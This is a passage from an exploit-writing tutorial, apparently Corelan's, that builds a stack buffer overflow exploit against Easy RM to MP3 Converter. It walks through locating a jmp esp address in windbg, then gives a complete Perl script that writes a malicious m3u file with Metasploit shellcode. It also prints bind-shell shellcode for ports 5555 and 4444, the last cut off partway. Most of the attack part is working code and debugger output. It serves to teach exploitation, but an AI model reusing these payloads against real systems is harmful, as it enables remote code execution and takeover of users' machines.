<h3>Jump to the shellcode in a reliable way</h3>
<div>We have managed to put our shellcode exactly where ESP points at (or, if you look at it from a different angle, ESP points directly at the beginning of our shellcode).&nbsp; If that would not have been the case, we would have looked to the contents of other register addresses and hope to find our buffer back.&nbsp; Anyways, in this particular example, we can use ESP.</div>
<div>The reasoning behind overwriting EIP with the address of ESP was that we want the application to jump to ESP and run the shellcode.</div>
<div>Jumping to ESP is a very common thing in windows applications. In fact, Windows applications use one or more dll’s, and these dll’s contains lots of code instructions.&nbsp; Furthermore, the addresses used by these dll’s are pretty static. So if we could find a dll that contains the instruction to jump to esp, and if we could overwrite EIP with the address of that instruction in that dll, then it should work, right ?</div>
<div>Let’s see. First of all, we need to figure out what the opcode for “jmp esp” is.</div>
<div>We can do this by Launching Easy RM to MP3, then opening windbg and hook windbg to the Easy RM to MP3 application. (Just connect it to the process, don’t do anything in Easy RM to MP3).&nbsp; This gives us the advantage that windbg will see all dll’s/modules that are loaded by the application. (It will become clear why I mentioned this)</div>
<div><a href="/wp-content/uploads/2009/07/image17.png" target="_blank" rel="noopener noreferrer" class="thickbox no_icon" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2009/07/image_thumb17.png" alt="image" width="201" height="212" border="0"></a></div>
<div>Upon attaching the debugger to the process, the application will break.</div>
<div>In the windbg command line, at the bottom of the screen, enter&nbsp; a&nbsp; <em>(assemble)</em> and press return</div>
<div>Now enter&nbsp; jmp esp and press return</div>
<div><a href="/wp-content/uploads/2009/07/image18.png" target="_blank" rel="noopener noreferrer" class="thickbox no_icon" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2009/07/image_thumb18.png" alt="image" width="611" height="92" border="0"></a></div>
<div>Press return again.</div>
<div>Now enter&nbsp; u <em>(unassemble)</em> followed by the address that was shown before entering&nbsp;&nbsp; jmp esp</div>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">0:014&gt; u 7c90120e
ntdll!DbgBreakPoint:
<strong><span style="color: #ff0000;">7c90120e ffe4            jmp     esp</span></strong>
7c901210 8bff            mov     edi,edi
ntdll!DbgUserBreakPoint:
7c901212 cc              <span style="color: #5576D1;">int</span>     3
7c901213 c3              ret
7c901214 8bff            mov     edi,edi
7c901216 8b442404        mov     eax,dword ptr [esp+4]
7c90121a cc              <span style="color: #5576D1;">int</span>     3
7c90121b c20400          ret     4</pre>
</div>
<div>Next to 7c90120e, you can see ffe4.&nbsp; This is the opcode for jmp esp</div>
<div>Now we need to find this opcode in one of the loaded dll’s.</div>
<div>Look at the top of the windbg window, and look for lines that indicate dll’s that belong to the Easy RM to MP3 application :</div>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">Microsoft (R) Windows Debugger Version 6.11.0001.404 X86
Copyright (c) Microsoft Corporation. All rights reserved.

*** wait with pending attach
Symbol search path <span style="color: #5576D1;">is</span>: *** Invalid ***
****************************************************************************
* Symbol loading may be unreliable without a symbol search path.           *
* Use .symfix to have the debugger choose a symbol path.                   *
* After setting your symbol path, use .reload to refresh symbol locations. *
****************************************************************************
Executable search path <span style="color: #5576D1;">is</span>:
ModLoad: 00400000 004be000   C:\Program Files\Easy RM to MP3 Converter\RM2MP3Converter.exe
ModLoad: 7c900000 7c9b2000   C:\WINDOWS\system32\ntdll.dll
ModLoad: 7c800000 7c8f6000   C:\WINDOWS\system32\kernel32.dll
ModLoad: 78050000 78120000   C:\WINDOWS\system32\WININET.dll
ModLoad: 77c10000 77c68000   C:\WINDOWS\system32\msvcrt.dll
ModLoad: 77f60000 77fd6000   C:\WINDOWS\system32\SHLWAPI.dll
ModLoad: 77dd0000 77e6b000   C:\WINDOWS\system32\ADVAPI32.dll
ModLoad: 77e70000 77f02000   C:\WINDOWS\system32\RPCRT4.dll
ModLoad: 77fe0000 77ff1000   C:\WINDOWS\system32\Secur32.dll
ModLoad: 77f10000 77f59000   C:\WINDOWS\system32\GDI32.dll
ModLoad: 7e410000 7e4a1000   C:\WINDOWS\system32\USER32.dll
ModLoad: 00330000 00339000   C:\WINDOWS\system32\Normaliz.dll
ModLoad: 78000000 78045000   C:\WINDOWS\system32\iertutil.dll
ModLoad: 77c00000 77c08000   C:\WINDOWS\system32\VERSION.dll
ModLoad: 73dd0000 73ece000   C:\WINDOWS\system32\MFC42.DLL
ModLoad: 763b0000 763f9000   C:\WINDOWS\system32\comdlg32.dll
ModLoad: 5d090000 5d12a000   C:\WINDOWS\system32\COMCTL32.dll
ModLoad: 7c9c0000 7d1d7000   C:\WINDOWS\system32\SHELL32.dll
ModLoad: 76080000 760e5000   C:\WINDOWS\system32\MSVCP60.dll
ModLoad: 76b40000 76b6d000   C:\WINDOWS\system32\WINMM.dll
ModLoad: 76390000 763ad000   C:\WINDOWS\system32\IMM32.DLL
ModLoad: 773d0000 774d3000   C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\comctl32.dll
ModLoad: 74720000 7476c000   C:\WINDOWS\system32\MSCTF.dll
ModLoad: 755c0000 755ee000   C:\WINDOWS\system32\msctfime.ime
ModLoad: 774e0000 7761d000   C:\WINDOWS\system32\ole32.dll
<strong><span style="color: #ff0000;">ModLoad: 10000000 10071000   C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll</span></strong>
ModLoad: 71ab0000 71ac7000   C:\WINDOWS\system32\WS2_32.dll
ModLoad: 71aa0000 71aa8000   C:\WINDOWS\system32\WS2HELP.dll
<strong><span style="color: #ff0000;">ModLoad: 00ce0000 00d7f000   C:\Program Files\Easy RM to MP3 Converter\MSRMfilter01.dll
ModLoad: 01a90000 01b01000   C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec00.dll
ModLoad: 00c80000 00c87000   C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec01.dll
ModLoad: 01b10000 01fdd000   C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec02.dll</span></strong>
ModLoad: 01fe0000 01ff1000   C:\WINDOWS\system32\MSVCIRT.dll
ModLoad: 77120000 771ab000   C:\WINDOWS\system32\OLEAUT32.dll</pre>
</div>
<div>If we can find the opcode in one of these dll’s, then we have a good chance of making the exploit work reliably across windows platforms.&nbsp; If we need to use a dll that belongs to the OS, then we might find that the exploit does not work for other versions of the OS.&nbsp; So let’s search the area of one of the Easy RM to MP3 dll’s first.</div>
<div>We’ll look in the area of C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec02.dll.&nbsp; This dll is loaded between 01b10000 and 01fd000.&nbsp; Search this area for ff e4 :</div>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">0:014&gt; s 01b10000 l 01fdd000 ff e4
01ccf23a  ff e4 ff 8d 4e 10 c7 44-24 10 ff ff ff ff e8 f3  ....N..D$.......
01d0023f  ff e4 fb 4d 1b a6 9c ff-ff 54 a2 ea 1a d9 9c ff  ...M.....T......
01d1d3db  ff e4 ca ce 01 20 05 93-19 09 00 00 00 00 d4 d1  ..... ..........
01d3b22a  ff e4 07 07 f2 01 57 f2-5d 1c d3 e8 09 22 d5 d0  ......W.]...."..
01d3b72d  ff e4 09 7d e4 ad 37 df-e7 cf 25 23 c9 a0 4a 26  ...}..7...%#..J&amp;
01d3cd89  ff e4 03 35 f2 82 6f d1-0c 4a e4 19 30 f7 b7 bf  ...5..o..J..0...
01d45c9e  ff e4 5c 2e 95 bb 16 16-79 e7 8e 15 8d f6 f7 fb  ..\.....y.......
01d503d9  ff e4 17 b7 e3 77 31 bc-b4 e7 68 89 bb 99 54 9d  .....w1...h...T.
01d51400  ff e4 cc 38 25 d1 71 44-b4 a3 16 75 85 b9 d0 50  ...8%.qD...u...P
01d5736d  ff e4 17 b7 e3 77 31 bc-b4 e7 68 89 bb 99 54 9d  .....w1...h...T.
01d5ce34  ff e4 cc 38 25 d1 71 44-b4 a3 16 75 85 b9 d0 50  ...8%.qD...u...P
01d60159  ff e4 17 b7 e3 77 31 bc-b4 e7 68 89 bb 99 54 9d  .....w1...h...T.
01d62ec0  ff e4 cc 38 25 d1 71 44-b4 a3 16 75 85 b9 d0 50  ...8%.qD...u...P
0221135b  ff e4 49 20 02 e8 49 20-02 00 00 00 00 ff ff ff  ..I ..I ........
0258ea53  ff e4 ec 58 02 00 00 00-00 00 00 00 00 08 02 a8  ...X............</pre>
</div>
<p>Excellent. (I did not expect otherwise… jmp esp is a pretty common instruction).&nbsp; When selecting an address, it is important to look for null bytes.&nbsp; You should try to avoid using addresses with null bytes (especially if you need to use the buffer data that comes after the EIP overwrite. The null byte would become a string terminator and the rest of the buffer data will become unusable).</p>
<p>Another good area to search for opcodes is</p>
<p>“s 70000000 l fffffff ff e4”&nbsp; (which would typically give results from windows dll’s)</p>
<p>Note : there are other ways to get opcode addresses :</p>
<ul>
<li><a href="http://www.securiteam.com/tools/5LP0C1PEUY.html" target="_blank" rel="noopener noreferrer external" data-wpel-link="external" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>findjmp</a> (from Ryan Permeh) : compile findjmp.c and run with the following parameters :</li>
</ul>
<blockquote><p>findjmp <dllfile> <register>.&nbsp; Suppose you want to look for jumps to esp in kernel32.dll, run&nbsp; “findjmp kernel32.dll esp”</register></dllfile></p>
<p>On Vista SP2, you should get something like this :</p>
<p><em>Findjmp, Eeye, I2S-LaB </em></p>
<p><em>Findjmp2, Hat-Squad</em></p>
<p>Scanning kernel32.dll for code useable with the esp register</p>
<p>0x773AF74B&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call esp</p>
<p>Finished Scanning kernel32.dll for code useable with the esp register</p>
<p>Found 1 usable addresses</p></blockquote>
<ul>
<li>the <a href="https://web.archive.org/web/20080704110517/http://www.metasploit.org/users/opcode/msfopcode.cgi" target="_blank" rel="noopener noreferrer external" data-wpel-link="external" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>metasploit opcode database</a></li>
<li>memdump (see one of the next tutorial posts</li>
<li>pvefindaddr, a plugin for Immunity Debugger. In fact, this one is highly recommended because it will automatically filter unreliable pointers.</li>
</ul>
<p>Since we want to put our shellcode in ESP (which is placed in our payload string <span style="text-decoration: underline;">after</span> overwriting EIP),&nbsp; the jmp esp address from the list must not have null bytes.&nbsp; If this address would have null bytes, we would overwrite EIP with an address that contains null bytes.&nbsp; Null byte acts as a string terminator, so everything that follows would be ignored.&nbsp;&nbsp; In some cases, it would be ok to have an address that starts with a null byte.&nbsp; If the address starts with a null byte, because of little endian, the null byte would be the last byte in the EIP register.&nbsp; And if you are not sending any payload after overwrite EIP (so if the shellcode is fed before overwriting EIP, and it is still reachable via a register), then this will work.</p>
<p>Anyways, we will use the payload after overwriting EIP to host our shellcode, so the address should not contain null bytes.</p>
<p>The first address will do : 0x01ccf23a</p>
<p>Verify that this address contains the jmp esp (so unassemble the instruction at 01ccf23a):</p>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">0:014&gt; u 01ccf23a
MSRMCcodec02!CAudioOutWindows::WaveOutWndProc+0x8bfea:
<strong><span style="color: #ff0000;">01ccf23a ffe4            jmp     esp</span></strong>
01ccf23c ff8d4e10c744    dec     dword ptr <unloaded_pool.drv>+0x44c7104d (44c7104e)[ebp]
01ccf242 2410            and     al,10h
01ccf244 ff              ???
01ccf245 ff              ???
01ccf246 ff              ???
01ccf247 ff              ???
01ccf248 e8f3fee4ff      call    MSRMCcodec02!CTN_WriteHead+0xd320 (01b1f140)</unloaded_pool.drv></pre>
</div>
<p>If we now overwrite EIP with 0x01ccf23a, a jmp esp will be executed. Esp contains our shellcode… so we should now have a working exploit. Let’s test with our “NOP &amp; break” shellcode.</p>
<p>Close windbg.</p>
<p>Create a new m3u file using the script below :</p>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">my $file= <span style="color: #006080;">"test1.m3u"</span>;
my $junk= <span style="color: #006080;">"A"</span> x 26094;
my $eip = pack(<span style="color: #006080;">'V'</span>,0x01ccf23a);  

my $shellcode = <span style="color: #006080;">"\x90"</span> x 25; 

$shellcode = $shellcode.<span style="color: #006080;">"\xcc"</span>;&nbsp; #this will cause the application to break, simulating shellcode, but allowing you to further debug
$shellcode = $shellcode.<span style="color: #006080;">"\x90"</span> x 25; 

open($FILE,<span style="color: #006080;">"&gt;$file"</span>);
print $FILE $junk.$eip.$shellcode;
close($FILE);
print <span style="color: #006080;">"m3u File Created successfully\n"</span>;</pre>
</div>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">(21c.e54): <span style="color: #ff0000;">Break instruction exception</span> - code 80000003 (!!! second chance !!!)
eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=0000662c
eip=000ff745 esp=000ff730 ebp=003440c0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
Missing image name, possible paged-<span style="color: #5576D1;">out</span> or corrupt data.
Missing image name, possible paged-<span style="color: #5576D1;">out</span> or corrupt data.
Missing image name, possible paged-<span style="color: #5576D1;">out</span> or corrupt data.
<unloaded_p32.dll>+0xff734:
000ff745 cc              <span style="color: #5576D1;">int</span>     3
0:000&gt; d esp
000ff730  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ff740  90 90 90 90 90 cc 90 90-90 90 90 90 90 90 90 90  ................
000ff750  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 00  ................
000ff760  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff770  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff780  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff790  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ff7a0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</unloaded_p32.dll></pre>
</div>
<div>Run the application again, attach windbg, press “g” to continue to run, and open the new m3u file in the application.</div>
<div>The application now breaks at address 000ff745, which is the location of our first break. So the jmp esp worked fine (esp started at 000ff730, but it contains NOPs all the way up to 000ff744).</div>
<div>All we need to do now is put in our real shellcode and finalize the exploit.</div>
<div>Close windbg again.</div>
<h3>Get shellcode and finalize the exploit</h3>
<p>Metasploit has a nice payload generator that will help you building shellcode.&nbsp;&nbsp; Payloads come with various options, and (depending on what they need to do), can be small or very large.&nbsp; If you have a size limitation in terms of buffer space, then you might even want to look at multi-staged shellcode, or using specifically handcrafted shellcodes such as <a href="http://packetstormsecurity.org/shellcode/23bytes-shellcode.txt" target="_blank" rel="noopener noreferrer external" data-wpel-link="external" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>this one</a> (32byte cmd.exe shellcode for xp sp2 en). Alternatively, <a href="http://code.google.com/p/w32-seh-omelet-shellcode/" target="_blank" rel="noopener noreferrer external" data-wpel-link="external" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>you can split up your shellcode in smaller ‘eggs’</a> and use a technique called ‘egg-hunting’ to reassemble the shellcode before executing it. Tutorial 8 and 10 talk about egg hunting and omelet hunters.</p>
<p>Let’s say we want calc to be executed as our exploit payload, then the shellcode could look like this :</p>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;"># windows/exec - 144 bytes
# http:<span style="color: #d7df01;">//www.metasploit.com</span>
# Encoder: x86/shikata_ga_nai
# EXITFUNC=seh, CMD=calc
my $shellcode = <span style="color: #006080;">"\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1"</span> .
<span style="color: #006080;">"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30"</span> .
<span style="color: #006080;">"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa"</span> .
<span style="color: #006080;">"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96"</span> .
<span style="color: #006080;">"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b"</span> .
<span style="color: #006080;">"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a"</span> .
<span style="color: #006080;">"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83"</span> .
<span style="color: #006080;">"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98"</span> .
<span style="color: #006080;">"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"</span> .
<span style="color: #006080;">"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"</span> .
<span style="color: #006080;">"\x7f\xe8\x7b\xca"</span>;</pre>
</div>
<p>Finalize the perl script, and try it out :</p>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;">#
# Exploit <span style="color: #5576D1;">for</span> Easy RM to MP3 27.3.700 vulnerability, discovered by Crazy_Hacker
# Written by Peter Van Eeckhoutte
# http:<span style="color: #d7df01;">//www.corelan.be</span>
# Greetings to Saumil and SK :-)
#
# tested on Windows XP SP3 (En)
#
#
#
my $file= <span style="color: #006080;">"exploitrmtomp3.m3u"</span>;

my $junk= <span style="color: #006080;">"A"</span> x 26094;
my $eip = pack(<span style="color: #006080;">'V'</span>,0x01ccf23a);  #jmp esp from MSRMCcodec02.dll

my $shellcode = <span style="color: #006080;">"\x90"</span> x 25;

# windows/exec - 144 bytes
# http:<span style="color: #d7df01;">//www.metasploit.com</span>
# Encoder: x86/shikata_ga_nai
# EXITFUNC=seh, CMD=calc
$shellcode = $shellcode . <span style="color: #006080;">"\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1"</span> .
<span style="color: #006080;">"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30"</span> .
<span style="color: #006080;">"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa"</span> .
<span style="color: #006080;">"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96"</span> .
<span style="color: #006080;">"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b"</span> .
<span style="color: #006080;">"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a"</span> .
<span style="color: #006080;">"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83"</span> .
<span style="color: #006080;">"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98"</span> .
<span style="color: #006080;">"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"</span> .
<span style="color: #006080;">"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"</span> .
<span style="color: #006080;">"\x7f\xe8\x7b\xca"</span>;

open($FILE,<span style="color: #006080;">"&gt;$file"</span>);
print $FILE $junk.$eip.$shellcode;
close($FILE);
print <span style="color: #006080;">"m3u File Created successfully\n"</span>;</pre>
</div>
<p>First, turn off the autopopup registry setting to prevent the debugger from taking over. Create the m3u file, open it and watch the application die (and calc should be opened as well).</p>
<p>Boom ! We have our first working exploit !</p>
<p><a href="/wp-content/uploads/2009/07/image14.png" target="_blank" rel="noopener noreferrer" class="thickbox no_icon" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2009/07/image_thumb14.png" alt="image" width="443" height="252" border="0"></a></p>
<blockquote><p>You may have noticed that I kept 25 nops (0x90) before the shellcode.&nbsp; Don’t worry about it too much right now. As you will continue to learn about exploiting (and when you reach the chapter about writing shellcode), you will learn why this may be required.</p></blockquote>
<p>&nbsp;</p>
<h3>What if you want to do something else than launching calc ?</h3>
<p>You could create other shellcode and replace the “launch calc” shellcode with your new shellcode, but this code may not run well because the shellcode may be bigger, memory locations may be different, and longer shellcode increases the risk on invalid characters in the shellcode, which need to be filtered out.</p>
<p>Let’s say we want the exploit bind to a port so a remote hacker could connect and get a command line.</p>
<p>This shellcode may look like this :</p>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;"># windows/shell_bind_tcp - 344 bytes
# http:<span style="color: #d7df01;">//www.metasploit.com</span>
# Encoder: x86/shikata_ga_nai
# EXITFUNC=seh, LPORT=5555, RHOST=
<span style="color: #006080;">"\x31\xc9\xbf\xd3\xc0\x5c\x46\xdb\xc0\xd9\x74\x24\xf4\x5d"</span> .
<span style="color: #006080;">"\xb1\x50\x83\xed\xfc\x31\x7d\x0d\x03\x7d\xde\x22\xa9\xba"</span> .
<span style="color: #006080;">"\x8a\x49\x1f\xab\xb3\x71\x5f\xd4\x23\x05\xcc\x0f\x87\x92"</span> .
<span style="color: #006080;">"\x48\x6c\x4c\xd8\x57\xf4\x53\xce\xd3\x4b\x4b\x9b\xbb\x73"</span> .
<span style="color: #006080;">"\x6a\x70\x0a\xff\x58\x0d\x8c\x11\x91\xd1\x16\x41\x55\x11"</span> .
<span style="color: #006080;">"\x5c\x9d\x94\x58\x90\xa0\xd4\xb6\x5f\x99\x8c\x6c\x88\xab"</span> .
<span style="color: #006080;">"\xc9\xe6\x97\x77\x10\x12\x41\xf3\x1e\xaf\x05\x5c\x02\x2e"</span> .
<span style="color: #006080;">"\xf1\x60\x16\xbb\x8c\x0b\x42\xa7\xef\x10\xbb\x0c\x8b\x1d"</span> .
<span style="color: #006080;">"\xf8\x82\xdf\x62\xf2\x69\xaf\x7e\xa7\xe5\x10\x77\xe9\x91"</span> .
<span style="color: #006080;">"\x1e\xc9\x1b\x8e\x4f\x29\xf5\x28\x23\xb3\x91\x87\xf1\x53"</span> .
<span style="color: #006080;">"\x16\x9b\xc7\xfc\x8c\xa4\xf8\x6b\xe7\xb6\x05\x50\xa7\xb7"</span> .
<span style="color: #006080;">"\x20\xf8\xce\xad\xab\x86\x3d\x25\x36\xdc\xd7\x34\xc9\x0e"</span> .
<span style="color: #006080;">"\x4f\xe0\x3c\x5a\x22\x45\xc0\x72\x6f\x39\x6d\x28\xdc\xfe"</span> .
<span style="color: #006080;">"\xc2\x8d\xb1\xff\x35\x77\x5d\x15\x05\x1e\xce\x9c\x88\x4a"</span> .
<span style="color: #006080;">"\x98\x3a\x50\x05\x9f\x14\x9a\x33\x75\x8b\x35\xe9\x76\x7b"</span> .
<span style="color: #006080;">"\xdd\xb5\x25\x52\xf7\xe1\xca\x7d\x54\x5b\xcb\x52\x33\x86"</span> .
<span style="color: #006080;">"\x7a\xd5\x8d\x1f\x83\x0f\x5d\xf4\x2f\xe5\xa1\x24\x5c\x6d"</span> .
<span style="color: #006080;">"\xb9\xbc\xa4\x17\x12\xc0\xfe\xbd\x63\xee\x98\x57\xf8\x69"</span> .
<span style="color: #006080;">"\x0c\xcb\x6d\xff\x29\x61\x3e\xa6\x98\xba\x37\xbf\xb0\x06"</span> .
<span style="color: #006080;">"\xc1\xa2\x75\x47\x22\x88\x8b\x05\xe8\x33\x31\xa6\x61\x46"</span> .
<span style="color: #006080;">"\xcf\x8e\x2e\xf2\x84\x87\x42\xfb\x69\x41\x5c\x76\xc9\x91"</span> .
<span style="color: #006080;">"\x74\x22\x86\x3f\x28\x84\x79\xaa\xcb\x77\x28\x7f\x9d\x88"</span> .
<span style="color: #006080;">"\x1a\x17\xb0\xae\x9f\x26\x99\xaf\x49\xdc\xe1\xaf\x42\xde"</span> .
<span style="color: #006080;">"\xce\xdb\xfb\xdc\x6c\x1f\x67\xe2\xa5\xf2\x98\xcc\x22\x03"</span> .
<span style="color: #006080;">"\xec\xe9\xed\xb0\x0f\x27\xee\xe7"</span>;</pre>
</div>
<p>As you can see, this shellcode is 344 bytes long (and launching calc only took 144 bytes).</p>
<p>If you just copy&amp;paste this shellcode, you may see that the vulnerable application does not even crash anymore.</p>
<p><a href="/wp-content/uploads/2009/07/image15.png" target="_blank" rel="noopener noreferrer" class="thickbox no_icon" data-wpel-link="internal"><img loading="lazy" decoding="async" style="display: inline; border-width: 0px;" title="image" src="/wp-content/uploads/2009/07/image_thumb15.png" alt="image" width="439" height="82" border="0"></a></p>
<p>This – most likely – indicates either a problem with the shellcode buffer size (but you can test the buffer size, you’ll notice that this is not the issue), or we are faced with invalid characters in the shellcode. You can exclude invalid characters when building the shellcode with metasploit, but you’ll have to know which characters are allowed and which aren’t.&nbsp; By default, null bytes are restricted (because they will break the exploit for sure), but what are the other characters ?</p>
<p>The m3u file probably should contain filenames. So a good start would be to filter out all characters that are not allowed in filenames and filepaths. You could also restrict the character set altogether by using another decoder. We have used shikata_ga_nai, but perhaps alpha_upper will work better for filenames.&nbsp; Using another encoded will most likely increase the shellcode length, but we have already seen (or we can simulate) that size is not a big issue.</p>
<p>Let’s try building a tcp shell bind, using the alpha_upper encoder.&nbsp; We’ll bind a shell to local port 4444.&nbsp; The new shellcode is 703 bytes.</p>
<div>
<pre style="line-height: 12pt; background-color: #f4f4f4; margin: 0em; width: 100%; font-family: consolas, 'Courier New', courier, monospace; color: black; font-size: 8pt; overflow: visible; border-style: none; padding: 0px;"># windows/shell_bind_tcp - 703 bytes
# http:<span style="color: #d7df01;">//www.metasploit.com</span>
# Encoder: x86/alpha_upper
# EXITFUNC=seh, LPORT=4444, RHOST=
<span style="color: #006080;">"\x89\xe1\xdb\xd4\xd9\x71\xf4\x58\x50\x59\x49\x49\x49\x49"</span> .
<span style="color: #006080;">"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"</span> .
<span style="color: #006080;">"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"</span> .
<span style="color: #006080;">"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"</span> .
<span style="color: #006080;">"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x42"</span> .
<span style="color: #006080;">"\x4a\x4a\x4b\x50\x4d\x4b\x58\x4c\x39\x4b\x4f\x4b\x4f\x4b"</span> .
<span style="color: #006080;">"\x4f\x43\x50\x4c\x4b\x42\x4c\x51\x34\x51\x34\x4c\x4b\x47"</span> .
<span style="color: #006080;">"\x35\x47\x4c\x4c\x4b\x43\x4c\x44\x45\x44\x38\x45\x51\x4a"</span> .
<span style="color: #006080;">"\x4f\x4c\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x51\x30\x43"</span> .
<span style="color: #006080;">"\x31\x4a\x4b\x50\x49\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a"</span> .
<span style="color: #006080;">"\x4e\x46\x51\x49\x50\x4a\x39\x4e\x4c\x4d\x54\x49\x50\x44"</span> .
<span style="color: #006080;">"\x34\x45\x57\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a"</span> .
<span style="color: #006080;">"\x4b\x4a\x54\x47\x4b\x51\x44\x51\x34\x47\x58\x44\x35\x4a"</span> .
<span style="color: #006080;">"\x45\x4c\x4b\x51\x4f\x47\x54\x43\x31\x4a\x4b\x45\x36\x4c"</span> .
<span style="color: #006080;">"\x4b\x44\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a"</span> .
<span style="color: #006080;">"\x4b\x44\x43\x46\x4c\x4c\x4b\x4d\x59\x42\x4c\x46\x44\x45"</span> .
<span style="color: #006080;">"\x4c\x43\x51\x48\x43\x46\x51\x49\x4b\x45\x34\x4c\x4b\x50"</span> .
<span style="color: #006080;">"\x43\x50\x30\x4c\x4b\x51\x50\x44\x4c\x4c\x4b\x42\x50\x45"</span> .
<span style="color: #006080;">"\x4c\x4e\x4d\x4c\x4b\x51\x50\x45\x58\x51\x4e\x43\x58\x4c"</span> .
<span style="color: #006080;">"\x4e\x50\x4e\x44\x4e\x4a\x4c\x50\x50\x4b\x4f\x48\x56\x43"</span> .
